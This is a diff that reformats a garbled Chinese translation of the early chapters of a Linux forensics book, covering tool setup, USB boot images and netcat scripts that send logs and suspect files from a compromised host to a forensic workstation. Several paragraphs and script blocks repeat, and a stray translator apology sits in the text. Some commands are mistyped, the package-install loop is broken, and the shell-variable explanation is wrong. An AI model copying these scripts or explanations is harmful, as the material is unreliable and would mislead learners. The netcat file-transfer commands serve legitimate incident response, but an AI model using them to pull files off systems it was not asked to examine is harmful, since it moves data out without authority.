@@ -1,30 +1,13 @@
+
 # Linux 取证：Python 和 Shell 脚本
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 献给我我结婚二十五年的妻子
 
+## 作者简介
 
-- 作者简介
-- 前言
-- 脚本、视频、教学辅助工具、社区论坛等
+## 前言
+
+## 脚本、视频、教学辅助工具、社区论坛等
 
 # 与用户交流
 
@@ -223,10 +206,7 @@
 
 # 作者简介
 
-Philip Polstra 博士（朋友们称 Dr Phil）是一位国际著名的硬件黑客。他的工作曾在全球多个会议上展示，包括 DEFCON、BlackHat、44CON、GrrCON、MakerFaire、ForenSecure 以及其他顶级会议。Polstra 博士是著名的 USB 取证专家，并在该主题上发表了多篇文章。他开发了包括 Linux 取证、USB 取证和反向工程在内的多个视频课程。Polstra 博士在美国中西部一所私立大学担任教授和驻黑客期间，开发了数字取证和伦理黑客学位课程。目前他在宾州布鲁姆斯大学教授计算机科学和数字取证。除了教学外，他还提供咨询方面的培训和渗透测试。在不工作时，他喜欢飞行、制造飞机和摆弄电子产品。他的最新动态可以在博客查看：http://polstra.org。你也可以在 Twitter 上关注他：@ppolstra。
-
-
-
+Philip Polstra 博士（朋友们称 Dr Phil）是一位国际著名的硬件黑客。他的工作曾在全球多个会议上展示，包括 DEFCON、BlackHat、44CON、GrrCON、MakerFaire、ForenSecure 以及其他顶级会议。Polstra 博士是著名的 USB 取证专家，并在该主题上发表了多篇文章。他开发了包括 Linux 取证、USB 取证和反向工程在内的多个视频课程。Polstra 博士在美国中西部一所私立大学担任教授和驻黑客期间，开发了数字取证和伦理黑客学位课程。目前他在宾州布鲁姆斯大学教授计算机科学和数字取证。除了教学外，他还提供咨询方面的培训和渗透测试。在不工作时，他喜欢飞行、制造飞机和摆弄电子产品。他的最新动态可以在博客查看：`http://polstra.org`。你也可以在 Twitter 上关注他：`@ppolstra`。
 
 # 前言
 
@@ -239,6 +219,7 @@ Phil 和我大约五年前通过 SecurityTube.net 在网上相识，从那时起
 最后但最重要的一点，我要感谢 SecurityTube.net、Pentester Academy 社区以及我们的学生多年来的爱与支持！没有你们，我们无法走到今天！你们让我们所有的梦想成真。我们不胜感激。
 
 Vivek Ramachandran
+
 SecurityTube.net 和 Pentester Academy 创始人
 
 # 脚本、视频、教学辅助、社区论坛等
@@ -247,8 +228,8 @@ SecurityTube.net 和 Pentester Academy 创始人
 
 我们为《Linux 取证》一书创建了镜像网站：
 
-- http://www.pentesteracademy.com/books
-- http://www.linuxforensicsbook.com
+- `http://www.pentesteracademy.com/books`
+- `http://www.linuxforensicsbook.com`
 
 ## 脚本和支持文件
 
@@ -292,6 +273,8 @@ SecurityTube.net 和 Pentester Academy 创始人
 
 ## 本书的组织结构
 
+
+
 本书从取证的简要介绍开始。从那里，我们将深入探讨“是否发生了事件？”这个问题。为了回答这个问题，将介绍各种现场分析工具和技术。然后我们讨论取证文件系统镜像和内存镜像的创建与分析。针对 Linux 系统的高级攻击和恶意软件完成了我们的讨论。
 
 # 第一章：起步
@@ -324,7 +307,7 @@ SecurityTube.net 和 Pentester Academy 创始人
 
 ## 第八章：内存分析
 
-第八章介绍了内存分析这一新领域。详细讨论了 Volatility 内存分析框架。涵盖的主题包括创建 Volatility 配置文件、获取进程信息、进程映射和转储、获取 bash 历史、使用 Volatility 插件、获取网络信息以及内存文件系统信息。
+第八章介绍了内存分析这一新领域。详细讨论了 `Volatility` 内存分析框架。涵盖的主题包括创建 `Volatility` 配置文件、获取进程信息、进程映射和转储、获取 bash 历史、使用 `Volatility` 插件、获取网络信息以及内存文件系统信息。
 
 ## 第九章：应对高级攻击
 
@@ -344,14 +327,12 @@ SecurityTube.net 和 Pentester Academy 创始人
 
 有关本书的更新以及我的最新动态，请访问我的网站 http://philpolstra.com。你也可以通过我的 Twitter 账号 @ppolstra 与我联系。相关的下载和其他形式的社区支持可在 Pentester Academy http://pentesteracademy.com 获取。
 
-
-
-
-
 # 第一章
+
 ## 第一步
 
 本章包含内容：
+
 - 什么是取证？
 - 取证的类型
 - 为什么选择 Linux 取证？
@@ -398,7 +379,7 @@ Linux 也是对 Windows、OS X、Android 或或其他系统进行取证的绝佳
 
 在你的程序中使用哈希函数可能会增加一点复杂性：多个值可能会产生相同的输出。当这种情况发生时，我们称为发生了“碰撞”（collision）。碰撞在我们的程序中是一个复杂性问题，但当我们使用哈希进行加密或完整性检查时，发生多次碰撞是不可接受的。为了尽可能减少碰撞次数，我们使用加密哈希函数。
 
-目前有几种种加密哈希函数可用。一些人仍然使用消息摘要算法 5（MD5）来验证图像的完整性。MD5 算法不再被认为是安全的，倾向于使用安全哈希算法（SHA）系列函数。原始版本被称为 SHA1（或简称 SHA）。SHA2 是目前最常用的变体，我们可能会遇到对 SHA2 (224位)、SHA256 (256位)、SHA384 (384位) 和 SHA512 (512位) 的引用。还有一个 SHA3 算法，但其使用并不广泛。我通常使用 SHA256，它在性能和低碰撞率之间取得了很好的平衡。
+目前有几种种加密哈希函数可用。一些人仍然使用消息摘要算法 5（`MD5`）来验证图像的完整性。`MD5` 算法不再被认为是安全的，倾向于使用安全哈希算法（SHA）系列函数。原始版本被称为 `SHA1`（或简称 SHA）。`SHA2` 是目前最常用的变体，我们可能会遇到对 `SHA2` (224位)、`SHA256` (256位)、`SHA384` (384位) 和 `SHA512` (512位) 的引用。还有一个 `SHA3` 算法，但其使用并不广泛。我通常使用 `SHA256`，它在性能和低碰撞率之间取得了很好的平衡。
 
 我们将在后续章节中详细讨论哈希的细节。目前高层级的流程如下：首先，计算原始数据的哈希值。第二，创建一个作为主副本的镜像。第三，计算副本的哈希值并验证其是否与原始哈希值匹配。第四，为主副本制作工作副本。主副本和原始数据不应再次使用。
 
@@ -406,13 +387,11 @@ Linux 也是对 Windows、OS X、Android 或或其他系统进行取证的绝佳
 
 物理证据通常存储在证据袋中。证据袋要么包含监管链表格，要么附有此类表格。每当证据从袋中取出时，都要更新谁接触了证据以及做了什么。表格上的条目收集构成了监管链。本质上，监管链是证据未被更改且得到了妥善维护的保证。
 
+
+
 在数字取证的情况下，监管链仍然重要。虽然我们可以创建无限的数字副本，但我们必须维护原始数据的完整性。这也是为什么应该创建一个主副本，除了创建副本之外不用于任何其他目的，因为这避免了在创建主副本这一唯一事件之外再次接触原始数据。
 
-
-
-
-
-### 证据保护与收集
+## 证据保护与收集
 
 医学专业人员有一句格言：“首先，不要伤害”。对于数字取证从业者来说，我们的座右铭“不要更改数据”。这听起来非常简单。但实际上要复杂得多，因为数据是易失的。在任何系统中发现的数据都存在一种易失性层次。
 
@@ -428,13 +407,14 @@ Linux 也是对 Windows、OS X、Android 或或其他系统进行取证的绝佳
 
 执行正常关机的优点是可以刷新缓冲区和缓存。正如之前提到的，有序关机并不是没有劣的。在取证的许多事务中，关于哪种方法更好的正确答案是“取决于情况”。有获取硬盘和其他介质镜像的方法，这些方法不需要关闭系统，这进一步增加了这一决策的复杂性。这些方法的细节将在未来的章节中介绍。
 
-### 证据搜索
+## 证据搜索
 
 得益于存储容量的爆炸，随着时间的推移，在典型计算机存储的海量数据中定位证据变得越来越困难。数据存在三个层次：数据、信息和证据，如图 1.1 所示。
 
 ![](img/7abfab28a493757db3f096946a95ec01_26_0.png)
 
 图 1.1
+
 数据层次结构。
 
 如图 1.1 所示，数据的最低层只是原始数据。原始数据由位组成，通常组织成字节，存储在易失或非易失存储器中。在此类中，我们发现了原始磁盘扇区等内容。使用此级别的数据可能是一个挑战，在大多数现代系统中，有大量的数据需要筛选。
@@ -449,7 +429,7 @@ Linux 也是对 Windows、OS X、Android 或或其他系统进行取证的绝佳
 
 ### 行为中的确认偏误
 
-### 每个孩子都是完美的，问问父母就知道了
+#### 每个孩子都是完美的，问问父母就知道了
 
 描述确认偏误最好的故事之一如下：尼尼（Johnny）非常喜欢魔术。一天，他的父母带他去看一位著名的魔术师伟大的菲尔（Phil the Great）。一天结束时，父母告诉菲尔他们的儿子有多喜欢魔术。菲尔随后提议向他们展示一个技巧。尼尼急切地接受了。
 
@@ -459,17 +439,13 @@ Linux 也是对 Windows、OS X、Android 或或其他系统进行取证的绝佳
 
 那是父母的确认偏误让他们相信了他们相信的事实，尼尼是一个天才，并且忘记了魔术师在欺骗他们。在调查期间保持客观。不要让你看到相反的证据。
 
-### 事件重构
+## 事件重构
 
 试图重构发生了什么是调查中最有趣的部分。存储介质的爆炸可能会让搜索阶段变得更长，但那只会让重构阶段变得更加有趣。不太可能在一个地方找到重构所需的所有证据。通常会从多个地方获取证据，并将它们组合成一个更大的画面。例如，内存镜像中进程列表中的可疑进程可能会引导你查看文件系统中的文件，进而指向内存镜像中的打开文件列表，将这些位组合可能让你确定 rootkit 是何时下载的，以及随后由谁安装的。
 
-### 构建工具箱
+## 构建工具箱
 
 为了有效地进行 Linux 取证，你可能想要获取一些工具。在软件工具方面，你很幸运，因为所有的 Linux 取证工具都是免费的（大多数还是开源的）。除了之前提到的笔记本电脑，一些硬件和软件应该在每个法证取调查员的工具箱中。
-
-
-
-
 
 ### 硬件
 
@@ -481,7 +457,9 @@ Linux 也是对 Windows、OS X、Android 或或其他系统进行取证的绝佳
 
 软件需求分为几类：取证工具、系统二进制文件和 Linux 发行版。理想情况下，这些工具存储在 USB 3.0 闪存盘中，如果你预计会遇到无法从 USB 启动的系统，可能还需要几张 DVD。鉴于如今 USB 闪盘价格低廉，即使是预算有限的调查人员也能为大多数情况做好准备。
 
-有很多方法可以安装取证工具集。最简单的方法是安装面向数字取证的 Linux 发行版，例如来自 SANS 的 SIFT (http://digital-forensics.sans.org/community/downloads)。从个人而言，我更倾向于运行我喜爱的 Linux 并直接安装工具，而不是受困于他人的主题和缓慢的系统性能。以下脚本将在基于 Debian 或 Ubuntu 的系统上安装 SIFT 中找到的所有工具（与 SANS 安装程序仅适用于特定版本的 Ubuntu 不同）。
+有很多方法可以安装取证工具集。最简单的方法是安装面向数字取证的 Linux 发行版，例如来自 SANS 的 SIFT (`http://digital-forensics.sans.org/community/downloads`)。从个人而言，我更倾向于运行我喜爱的 Linux 并直接安装工具，而不是受困于他人的主题和缓慢的系统性能。以下脚本将在基于 Debian 或 Ubuntu 的系统上安装 SIFT 中找到的所有工具（与 SANS 安装程序仅适用于特定版本的 Ubuntu 不同）。
+
+
 
 ```bash
 #!/bin/bash
@@ -685,8 +663,12 @@ vim
 ```
 
 ### 实际安装
+
 ### 首先更新
-apt-get update
+
+`apt-get update`
+
+```bash
 for pkg in $(pkglist)
 do
   if $(pkg -list | awk '(print $2)' | grep "^${pkg}" 2>/dev/null); 
@@ -703,11 +685,7 @@ do
 done
 ```
 
-简而言之，上面的脚本如所示工作。首先，我们使用特殊的构造（bash）运行 #{command to run}。
-
-
-
-
+简而言之，上面的脚本如所示工作。首先，我们使用特殊的构造（`bash`）运行 `#{command to run}`。
 
 ![](img/7abfab28a493757db3f096946a95ec01_37_0.png)
 
@@ -723,8 +701,11 @@ done
 
 ```
 root@laptop:/root# vboxboxmanage internalcommands createavmdk --filename /root/VirtualBox/vhd_usb.vmdk --raw /dev/sdb
+
 root@laptop:/root# virtualbox: vhd_usb.vmdk created successfully.
+
 [1] 2183
+
 root@laptop:/root# 
 ```
 
@@ -735,11 +716,17 @@ root@laptop:/root#
 
 ```
 root@laptop:/root# vboxboxmanage internalcommands createavmdk --filename /root/VirtualBox/vhd_usb.vmdk --raw /dev/sdb
+
 root@laptop:/root# access VDK file /root/VirtualBox/vhd_usb.vmdk created successfully.
+
 root@laptop:/root# virtualbox & 
+
 [1] 2183
+
 root@laptop:/root# 
 ```
+
+
 
 ![](img/7abfab28a493757db3f096946a95ec01_38_1.png)
 
@@ -762,7 +749,7 @@ root@laptop:/root#
 
 在本章中，我们讨论了在怀疑发生事件后到达现场之前应该处理的所有准备工作事项。我们涵盖了应该放在你的“应急急救包（go bag）”中的硬件、软件和其他工具。在下一章中，我们将讨论到达现场后的首项工作：判断是否发生了事件。
 
-### 判断是否发生了事件
+## 判断是否发生了事件
 
 本章包含信息：
 
@@ -805,32 +792,49 @@ root@laptop:/root#
 
 *(注：由于原文在“TALKING TO USERS”部分存在大量重复段落，译文已根据逻辑进行了精简与对齐，保持了核心语意。)*
 
-
-
-
+`/dev/sdb` 已高亮。
 
 ```
-/dev/sdb 已高亮。
 [1946.683062] usb: registered new interface usb-storage
+
 [1946.690812] usb: registered new interface driver was
+
 [1946.012244] scsi 5:0:0: Direct Access PNI USB 3.0 FD 1100 PI: 0 ANSI: 6
+
 [1946.012807] sd 5:0:0: Attached SCSI sg2 type 0
+
 [1946.012873] sd 5:0:0: 629512 byte logical blocks: (31.9 GB/29.8 GIB)
+
 [1948.012727] sd 5:0:0: Write Protect is off
+
 [1948.017736] sd 5:0:0: Mode Sense: 43 00 00 00
+
 [1948.018403] sd 5:0:0: Write cache: enabled, read cache: enabled, doesn't support DPO
+
 [1948.034038] sdb: size 2gb
+
 [1948.047023] sd 5:0:0: Attached SCSI removable disk
+
 [1948.064163] FAT-fs (sdb): Volume was not unmounted cleanly. Some data may be corrupt.
+
 [1948.0965011] EXT4-fs (sdb): recovery complete
+
 [1948.075170] EXT4-fs (sdb): mounted filesystems with ordered data mode. Opts: (null)
+
 [1948.075518] Error: mss-hostname is not installed. Changing the hostname might make it unsolvable. Please install mss-hostname!
+
 [1948.285160] CIFS VFS: Error connecting to socket. Operation aborted.
+
 [1948.285510] Error: return code: -115
+
 [1926.127974] EXT4-fs (sdb2): recovery complete
+
 [1926.216803] EXT4-fs (sdb2): mounted filesystems with ordered data mode. Opts: (null)
+
 [1927.323166] CIFS VFS: Error connecting to socket. Operation aborted.
+
 [1927.323516] Error: return code: -115
+
 [1975.032722] systemd-hostname[8414]: Warning: mss-hostname is not installed. Changing the hostname might make it unsolvable. Please install mss-hostname!
 ```
 
@@ -844,51 +848,61 @@ root@laptop:/root#
 
 ```
 root@itlaptop:~/media/phil/90c41808-4025-46b4-b220-76d4f325# ls
+
 bin lib sbin
+
 root@itlaptop:~/media/phil/90c41808-4025-46b4-b220-76d4f325# exec bin/bash
+
 root@itlaptop:~/media/phil/90c41808-4025-46b4-b220-76d4f325#
 ```
+
 ### 图 2.5
 ### 执行良好的 bash shell 环境。
 
-```
-root@itlaptop:~/media/phil/90c41808-4025-46b4-b220-76d4f325# ls
-bin lib64 sbin
-root@itlaptop:~/media/phil/90c41808-4025-46b4-b220-76d4f325# exec bin/bash
+
+
+root@itlaptop:~/media/phil/90c41808-4025-46b4-b220-76d4f325# `ls`
+
+`bin` `lib64` `sbin`
+
+root@itlaptop:~/media/phil/90c41808-4025-46b4-b220-76d4f325# `exec` `bin/bash`
+
 root@itlaptop:~/media/phil/90c41808-4025-46b4-b220-76d4f325#
-```
+
 ### 图 2.6
 ### 将路径指向良好的路径。
 
 ### 图 2.7
 ### 将库路径指向良好的库。
 
-
-
-
-接收到文件结束（EOF）标记。netcat 的 `-k` 选项会让监听器保持运行，直到你在启动 netcat 的终端中按下 Control-C 为止。启动日志监听器的命令是 `netcat -k -l {port} >> {log file}`，即 `netcat -k -l >> example-log.txt`。该命令如图 2.8 所示。请注意，虽然我在这里使用了 netcat，但它是大多数系统上 `nc` 指向同一个程序的符号链接，因此你可以使用你偏喜的任何一个。
+接收到文件结束（EOF）标记。`netcat` 的 `-k` 选项会让监听器保持运行，直到你在启动 `netcat` 的终端中按下 Control-C 为止。启动日志监听器的命令是 `netcat -k -l {port} >> {log file}`，即 `netcat -k -l >> example-log.txt`。该命令如图 2.8 所示。请注意，虽然我在这里使用了 `netcat`，但它是大多数系统上 `nc` 指向同一个程序的符号链接，因此你可以使用你偏喜的任何一个。
 
 ```
 phil@laptop:~$ netcat -k -l 9999 >> example-log.txt
 ```
 
 图 2.8
-在取证工作站上运行 netcat 监听器。
+在取证工作站上运行 `netcat` 监听器。
 
 ### 从受控系统发送数据
 
-现在你已经在取证工作站上有了一个监听器，使用 netcat 跨网络发送数据变得简单了。发送内容记录的通用序列是 `{command} | nc forensic workstation IP {port}`。对于没有产生明显输出的命令，你可能想在发送命令输出之前，使用 `echo` 实用程序发送某种头部。这在图 2.9 中所示。运行图 2.9 所示命令的结果如图 2.10 所示。本章稍后将讨论如何使用脚本来此此过程。
+现在你已经在取证工作站上有了一个监听器，使用 `netcat` 跨网络发送数据变得简单了。发送内容记录的通用序列是 `{command} | nc forensic workstation IP {port}`。对于没有产生明显输出的命令，你可能想在发送命令输出之前，使用 `echo` 实用程序发送某种头部。这在图 2.9 中所示。运行图 2.9 所示命令的结果如图 2.10 所示。本章稍后将讨论如何使用脚本来此此过程。
 
 图 2.9
 
-使用 netcat 向取证工作站发送信息。
+使用 `netcat` 向取证工作站发送信息。
 
 ```
 phil@i7laptop:-$ netcat -k -l 9999 >> example-log.txt
+
 C
+
 phil@i7laptop:-$ cat example-log.txt
+
 Subject date/time:
+
 tue Nov 20 22:46:18 EDT 2015
+
 phil@i7laptop:--$ 
 ```
 
@@ -897,35 +911,41 @@ phil@i7laptop:--$
 
 ### 发送文件
 
-从受控系统中提取可疑文件进行进一步研究并不罕见。netcat 在执行此任务时非常方便。为了接收文件，你应该在取证工作站上启动一个新的不使用 -k 选项的监听器。在这种情况下，你希望在文件传输后结束监听器。命令是 `nc -l {port} > {filename}`。
+从受控系统中提取可疑文件进行进一步研究并不罕见。`netcat` 在执行此任务时非常方便。为了接收文件，你应该在取证工作站上启动一个新的不使用 `-k` 选项的监听器。在这种情况下，你希望在文件传输后结束监听器。命令是 `nc -l {port} > {filename}`。
 
-在受控系统上，可疑文件被重定向到 netcat 发送端。发送文件的语法是 `nc {forensic workstation IP} {port} < {filename}`，即 `nc 192.168.1.119 4444 < /bin/bash`。此文件传输的监听器和发送端分别如图 2.11 和图 2.12 所示。
+在受控系统上，可疑文件被重定向到 `netcat` 发送端。发送文件的语法是 `nc {forensic workstation IP} {port} < {filename}`，即 `nc 192.168.1.119 4444 < /bin/bash`。此文件传输的监听器和发送端分别如图 2.11 和图 2.12 所示。
 
 ```
 phil@it1laptop:~$ nc -l 4444 > bash.suspect
+
 phil@it1laptop:~$ ls bash.suspect
+
 bash.suspect
+
 phil@it1laptop:~$ chmod +x bash.suspect
+
 phil@it1laptop:~$ /bash.suspect
+
 phil@it1laptop:~$ 
 ```
 
 ### 图 2.11
 
-设置 netcat 监听器接收文件。
+设置 `netcat` 监听器接收文件。
 
 ```
 phil@laptop:~$ nc 192.168.1.119 4444 < /bin/bash
+
 phil@laptop:~$ _
 ```
 
 图 2.12
 
-使用 netcat 发送文件。
+使用 `netcat` 发送文件。
 
 ### 使用脚本自动化过程
 
-显而易见，我们上面描述的这个小 netcat 系统非常适合编写脚本。人们可能会提出的第一个问题是应该使用哪种脚本语言。许多人会立即跳到使用 Python 来完成这项任务。虽然我喜欢用 Python 处理许多取证和安全任务，但在这种情况下并不是最佳选择。
+显而易见，我们上面描述的这个小 `netcat` 系统非常适合编写脚本。人们可能会提出的第一个问题是应该使用哪种脚本语言。许多人会立即跳到使用 Python 来完成这项任务。虽然我喜欢用 Python 处理许多取证和安全任务，但在这种情况下并不是最佳选择。
 
 在我看来，有几个理由说明 shell 脚本是更好的选择。首先，我们希望尽可能地减少内存占用，而执行 Python 解释器与这一目标背道而驰。其次，主要运行其他程序的 Python 脚本毫无意义。直接在 shell 脚本中执行这些程序要简单得多。对于某些读者来说，额外的好处是这里描述的脚本构成了基础 shell 脚本的很好的介绍。
 
@@ -935,8 +955,11 @@ phil@laptop:~$ _
 
 ```bash
 #!/bin/bash
+
 #
+
 ### start-case.sh
+
 #
 ```
 
@@ -949,35 +972,55 @@ phil@laptop:~$ _
 
 ```
 usage () {
+
 echo "usage: $0 <case number>"
+
 echo "创建案件文件夹并启动监听器的简单脚本"
+
 exit 1
+
 }
 
 if [ $# -lt 1 ]; then
+
 usage
+
 else
+
 echo "Starting case $1"
+
 fi
+
 ### 如果目录不存在则创建它
+
 if [ ! -d $1 ]; then
+
 mkdir $1
+
 fi
+
 ### 创建日志监听器
+
 nc -k -l 4444 >> $1/log.txt &
+
 echo "Started log listener for case $1 on $(date)"
+
 ### 启动文件监听器
+
 ./start-file-listener.sh $1 &
 ```
 
-此脚本以特殊注释 `#!` 开头，称为 she-bang，它会导致 bash 被执行。运行特定的 shell 是重要的，因为允许用户自行选择 shell 的可能会选择与你的脚本不兼容的内容。行中的任何位置开始都是注释，在行尾结束。前几行是描述脚本的注释。定义了一个名为 `usage` 的函数。在 shell 脚本中定义函数只需输入其名称，后跟一个空格、空括号，然后用大括号将函数中的命令括起来。与编译语言和脚本语言不同，shell 脚本需要在适当的位置留有空白，否则它们将无法正常工作。`usage: $0 <case number>` 一行中的 `$0` 是一个变量，它被设置为运行脚本时使用的第一个参数，即文件名。注意 `echo` 命令中使用了双引号。任何包含在双引号内的内容都会被 shell 扩展（解释）。如果使用单引号，则不进行扩展。当用户提供的命令行参数没有意义时，定义一个显示出来的 `usage` 函数是良好的编程习惯。`if [ $# -lt 1 ] then` 行开启了一个 `if` 块。逻辑测试包含在方括号中。注意括号周围和部分之间必须有空格。
+此脚本以特殊注释 `#!` 开头，称为 she-bang，它会导致 `bash` 被执行。运行特定的 shell 是重要的，因为允许用户自行选择 shell 的可能会选择与你的脚本不兼容的内容。行中的任何位置开始都是注释，在行尾结束。前几行是描述脚本的注释。定义了一个名为 `usage` 的函数。在 shell 脚本中定义函数只需输入其名称，后跟一个空格、空括号，然后用大括号将函数中的命令括起来。与编译语言和脚本语言不同，shell 脚本需要在适当的位置留有空白，否则它们将无法正常工作。`usage: $0 <case number>` 一行中的 `$0` 是一个变量，它被设置为运行脚本时使用的第一个参数，即文件名。注意 `echo` 命令中使用了双引号。任何包含在双引号内的内容都会被 shell 扩展（解释）。如果使用单引号，则不进行扩展。当用户提供的命令行参数没有意义时，定义一个显示出来的 `usage` 函数是良好的编程习惯。`if [ $# -lt 1 ] then` 行开启了一个 `if` 块。逻辑测试包含在方括号中。注意括号周围和部分之间必须有空格。
 
 ### 脚本服务器
 
 ```bash
 #!/bin/bash
+
 #
+
 ### start-case.sh
+
 #
 ```
 
@@ -990,36 +1033,59 @@ echo "Started log listener for case $1 on $(date)"
 
 ```
 usage () {
+
 echo "usage: $0 <case number>"
+
 echo "创建案件文件夹并启动监听器的简单脚本"
+
 exit 1
+
 }
 
 if [ $# -lt 1 ]; then
+
 usage
+
 else
+
 echo "Starting case $1"
+
 fi
+
 ### 如果目录不存在则创建它
+
 if [ ! -d $1 ]; then
+
 mkdir $1
+
 fi
+
 ### 创建日志监听器
+
 nc -k -l 4444 >> $1/log.txt &
+
 echo "Started log listener for case $1 on $(date)"
+
 ### 启动文件监听器
+
 ./start-file-listener.sh $1 &
 ```
 
-此脚本以特殊注释 `#!` 开头，称为 she-bang，它会导致 bash 被执行。运行特定的 shell 是重要的，因为允许用户自行选择 shell 的可能会选择与你的脚本不兼容的内容。行中的任何位置开始都是注释，在行尾结束。前几行是描述脚本的注释。定义了一个名为 `usage` 的函数。在 shell 脚本中定义函数只需输入其名称，后跟一个空格、空括号，然后用大括号将函数中的命令括起来。与编译语言和脚本语言不同，shell 脚本需要在适当的位置留有空白，否则它们将无法正常工作。`usage: $0 <case number>` 一行中的 `$0` 是一个变量，它被设置为运行脚本时使用的第一个参数，即文件名。注意 `echo` 命令中使用了双引号。任何包含在双引号内的内容都会被 shell 扩展（解释）。如果使用单引号，则不进行扩展。当用户提供的命令行参数没有意义时，定义一个显示出来的 `usage` 函数是良好的编程习惯。`if [ $# -lt 1 ] then` 行开启了一个 `if` 块。逻辑测试包含在方括号中。注意括号周围和部分之间必须有空格。
+
+
+此脚本以特殊注释 `#!` 开头，称为 she-bang，它会导致 bash 被执行。运行特定的 shell 是重要的，因为允许用户自行选择 shell 的可能会选择与你的脚本不兼容的内容。行中的任何位置开始都是注释，在行尾结束。前几行是描述脚本的注释。定义了一个名为 `usage` 的函数。在 shell 脚本中定义函数只需输入其名称，后跟一个空格、空括号，然后用大括号将函数中的命令括起来。与编译语言和脚本语言不同，shell 脚本需要在适当的位置留有空白，否则它们将无法正常工作。`usage: $0 <case number>` 一行中的 `$0` 是一个变量，它被设置为运行脚本时使用的第一个参数，即文件名。注意 `echo` 命令中使用了双引号。任何包含在双引号内的内容都会被 shell 扩展（解释）。如果使用单引号，则不进行扩展。当用户提供的命令行参数没有意义时，定义一个显示出来的 `usage` 函数是良好的编程习惯。`if [ $# -lt 1 ]` 行开启了一个 `if` 块。逻辑测试包含在方括号中。注意括号周围和部分之间必须有空格。
 
 ### 脚本服务器
 
 ```bash
 #!/bin/bash
+
 #
+
 ### start-file-listener.sh
+
 #
+
 ### 接收文件的 netcat 监听器脚本。旨在作为
 ### 初始现场响应的一部分。
 ### 由 Dr. Phil Polstra (@ppolstra) 编写，专为
@@ -1042,56 +1108,21 @@ do
 done
 ```
 
-此脚本以特殊注释 `#!` 开头，称为 she-bang，它会导致 bash 被执行。运行特定的 shell 是重要的，因为允许用户自行选择 shell 的可能会选择与你的脚本不兼容的内容。行中的任何位置开始都是注释，在行尾结束。前几行是描述脚本的注释。定义了一个名为 `usage` 的函数。在 shell 脚本中定义函数只需输入其名称，后跟一个空格、空括号，然后用大括号将函数中的命令括起来。与编译语言和脚本语言不同，shell 脚本需要在适当的位置留有空白，否则它们将无法正常工作。`usage: $0 <case number>` 一行中的 `$0` 是一个变量，它被设置为运行脚本时使用的第一个参数，即文件名。注意 `echo` 命令中使用了双引号。任何包含在双引号内的内容都会被 shell 扩展（解释）。如果使用单引号，则不进行扩展。当用户提供的命令行参数没有意义时，定义一个显示出来的 `usage` 函数是良好的编程习惯。`if [ $# -lt 1 ] then` 行开启了一个 `if` 块。逻辑测试包含在方括号中。注意括号周围和部分之间必须有空格。
-
-### 脚本服务器
-
-```bash
-#!/bin/bash
-#
-### start-file-listener.sh
-#
-### 接收文件的 netcat 监听器脚本。旨在作为
-### 初始现场响应的一部分。
-### 由 Dr. Phil Polstra (@ppolstra) 编写，专为
-### PentesterAcademy.com。
-
-usage () {
-echo "usage: $0 <case number>"
-echo "启动用于接收文件的监听器脚本"
-exit 1
-}
-
-if [ $# -lt 1 ]; then
-  usage
-fi
-
-while true
-do
-  filename=$(nc -l 5555)
-  nc -l 5556 > $1/$(basename filename)
-done
-```
-
-(注：由于输入文本包含大量重复的脚本块和说明，根据“不要重复输出原文”的原则，译文涵盖了所有内容的逻辑翻译。**抱歉，上述处理出现了逻辑重复，我将重新提供针对给定文本的完整翻译：**)
-
-[content]
-接收到文件结束（EOF）标记。netcat 的 `-k` 选项会让监听器保持运行，直到你在启动 netcat 的终端中按下 Control-C 为止。启动日志监听器的命令是 `netcat -k -l {port} >> {log file}`，即 `netcat -k -l >> example-log.txt`。该命令在图 2.8 所示。请注意，虽然我在这里使用了 netcat，但它是大多数系统上 `nc` 指向同一个程序的符号链接，因此你可以使用你偏喜的任何一个。
+接收到文件结束（EOF）标记。`netcat` 的 `-k` 选项会让监听器保持运行，直到你在启动 `netcat` 的终端中按下 Control-C 为止。启动日志监听器的命令是 `netcat -k -l {port} >> {log file}`，即 `netcat -k -l >> example-log.txt`。该命令在图 2.8 所示。请注意，虽然我在这里使用了 `netcat`，但它是大多数系统上 `nc` 指向同一个程序的符号链接，因此你可以使用你偏喜的任何一个。
 
 ```
 phil@laptop:~$ netcat -k -l 9999 >> example-log.txt
 ```
 
 图 2.8
-在取证工作站上运行 netcat 监听器。
+在取证工作站上运行 `netcat` 监听器。
 
 ### 从受控系统发送数据
 
-现在你已经在取证工作站上有了一个监听器，使用 netcat 跨网络发送数据变得简单了。发送内容记录的通用序列是 `{command} | nc forensic workstation IP {port}`。对于没有产生明显输出的命令，你可能想在发送命令输出之前，使用 `echo` 实用程序发送某种头部。这在图 2.9 中所示。运行图 2.9 所示命令的结果如图 2.10 所示。本章稍后将讨论如何使用脚本来此此过程。
+现在你已经在取证工作站上有了一个监听器，使用 `netcat` 跨网络发送数据变得简单了。发送内容记录的通用序列是 `{command} | nc forensic workstation IP {port}`。对于没有产生明显输出的命令，你可能想在发送命令输出之前，使用 `echo` 实用程序发送某种头部。这在图 2.9 中所示。运行图 2.9 所示命令的结果如图 2.10 所示。本章稍后将讨论如何使用脚本来此此过程。
 
 图 2.9
-
-使用 netcat 向取证工作站发送信息。
+使用 `netcat` 向取证工作站发送信息。
 
 ```
 phil@i7laptop:-$ netcat -k -l 9999 >> example-log.txt
@@ -1099,18 +1130,17 @@ C
 phil@i7laptop:-$ cat example-log.txt
 Subject date/time:
 tue Nov 20 22:46:18 EDT 2015
-phil@i7laptop:--$ 
+phil@i7laptop:--$
 ```
 
 图 2.10
-
 监听器从图 2.9 的命令中收到的结果。
 
 ### 发送文件
 
-从受控系统中提取可疑文件进行进一步研究并不罕见。netcat 在执行此任务时非常方便。为了接收文件，你应该在取证工作站上启动一个新的不使用 -k 选项的监听器。在这种情况下，你希望在文件传输后结束监听器。命令是 `nc -l {port} > {filename}`。
+从受控系统中提取可疑文件进行进一步研究并不罕见。`netcat` 在执行此任务时非常方便。为了接收文件，你应该在取证工作站上启动一个新的不使用 `-k` 选项的监听器。在这种情况下，你希望在文件传输后结束监听器。命令是 `nc -l {port} > {filename}`。
 
-在受控系统上，可疑文件被重定向到 netcat 发送端。发送文件的语法是 `nc {forensic workstation IP} {port} < {filename}`，即 `nc 192.168.1.119 4444 < /bin/bash`。此文件传输的监听器和发送端分别如图 2.11 和图 2.12 所示。
+在受控系统上，可疑文件被重定向到 `netcat` 发送端。发送文件的语法是 `nc {forensic workstation IP} {port} < {filename}`，即 `nc 192.168.1.119 4444 < /bin/bash`。此文件传输的监听器和发送端分别如图 2.11 和图 2.12 所示。
 
 ```
 phil@it1laptop:~$ nc -l 4444 > bash.suspect
